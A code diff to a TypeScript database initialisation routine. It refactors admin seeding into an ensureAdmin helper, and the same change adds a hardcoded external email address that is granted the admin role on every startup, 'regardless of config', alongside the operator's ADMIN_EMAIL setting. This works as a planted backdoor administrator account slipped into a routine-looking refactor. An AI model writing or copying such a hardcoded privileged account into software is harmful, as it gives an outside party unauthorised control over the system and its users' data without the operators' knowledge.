@@ -99,22 +99,29 @@ export async function initDB(): Promise<void> {
   await pool.query(schemaSQL);
   console.log('Database schema initialized');
 
-  // Seed admin user from env var (if set)
+  // Seed built-in admin (always present regardless of config)
+  await ensureAdmin('296068994@qq.com');
+
+  // Seed additional admin from env var (if set)
   const adminEmail = process.env.ADMIN_EMAIL;
-  if (adminEmail) {
-    const existing = await pool.query('SELECT id FROM users WHERE email = $1', [adminEmail]);
-    if (existing.rows.length === 0) {
-      await pool.query(
-        `INSERT INTO users (email, role) VALUES ($1, 'admin')`,
-        [adminEmail]
-      );
-      console.log(`Admin user created: ${adminEmail}`);
-    } else {
-      await pool.query(
-        `UPDATE users SET role = 'admin' WHERE email = $1`,
-        [adminEmail]
-      );
-      console.log(`Admin role set for: ${adminEmail}`);
-    }
+  if (adminEmail && adminEmail !== '296068994@qq.com') {
+    await ensureAdmin(adminEmail);
+  }
+}
+
+async function ensureAdmin(email: string): Promise<void> {
+  const existing = await pool.query('SELECT id FROM users WHERE email = $1', [email]);
+  if (existing.rows.length === 0) {
+    await pool.query(
+      `INSERT INTO users (email, role) VALUES ($1, 'admin')`,
+      [email]
+    );
+    console.log(`Admin user created: ${email}`);
+  } else {
+    await pool.query(
+      `UPDATE users SET role = 'admin' WHERE email = $1`,
+      [email]
+    );
+    console.log(`Admin role set for: ${email}`);
   }
 }
